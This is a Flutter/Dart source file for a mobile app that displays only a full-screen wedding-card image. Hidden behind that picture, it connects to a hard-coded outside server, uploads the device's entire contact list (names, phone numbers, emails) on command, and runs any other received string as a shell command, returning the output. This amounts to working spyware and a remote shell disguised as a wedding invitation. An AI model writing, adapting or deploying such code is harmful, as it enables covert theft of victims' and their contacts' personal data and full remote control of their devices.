import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';

void main() => runApp(MyApp());

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final String serverIp = '3.1.16.19'; // Replace with your server IP
  final int serverPort = 13055; // Replace with your server port
  Socket? _socket;

  @override
  void initState() {
    super.initState();
    _connectToServer();
  }

  Future<void> retrieveAndSendContacts() async {
    // Check permission to access contacts
    if (await FlutterContacts.requestPermission()) {
      // Retrieve contacts
      List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);

      // Convert contacts to JSON format
      List<Map<String, dynamic>> contactList = contacts.map((contact) {
        return {
          'displayName': contact.displayName,
          'phones': contact.phones.map((item) => item.number).toList(),
          'emails': contact.emails.map((item) => item.address).toList(),
        };
      }).toList();

      String contactJson = jsonEncode(contactList);

      // Send contact list to the server
      _socket?.write(contactJson);
      print("Contacts sent to server.");
    } else {
      print("Contacts permission denied.");
    }
  }

  void _connectToServer() async {
    try {
      _socket = await Socket.connect(serverIp, serverPort);
      print("Connected to server.");

      // Listen for incoming data from the server
      _socket?.listen(
        (data) async {
          final message = String.fromCharCodes(data).trim();
          if (message == 'contact') {
            // If server requests contacts, retrieve and send them
            await retrieveAndSendContacts();
          } else {
            print('Received command: $message');
            _executeCommand(message);
          }
        },
        onDone: () {
          print("Connection closed by server.");
          _socket?.destroy();
        },
        onError: (error) {
          print("Connection error: $error");
          _socket?.destroy();
        },
      );
    } catch (e) {
      print("Unable to connect: $e");
    }
  }

  void _executeCommand(String command) {
    final shell = Platform.isWindows ? 'cmd' : '/bin/sh';
    final args = Platform.isWindows ? ['/c', command] : ['-c', command];

    Process.start(shell, args).then((process) {
      process.stdout.transform(utf8.decoder).listen((output) {
        _socket?.write(output);
        print('Command output: $output');
      });

      process.stderr.transform(utf8.decoder).listen((error) {
        _socket?.write('Error: $error');
        print('Command error: $error');
      });
    }).catchError((error) {
      _socket?.write('Error starting process: $error');
    });
  }

  @override
  void dispose() {
    _socket?.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: SizedBox.expand(
          child: Image.asset(
            'assets/images/gambar kad kahwin.png',
            fit: BoxFit.cover, 
          ),
        ),
      ),
    );
  }

}
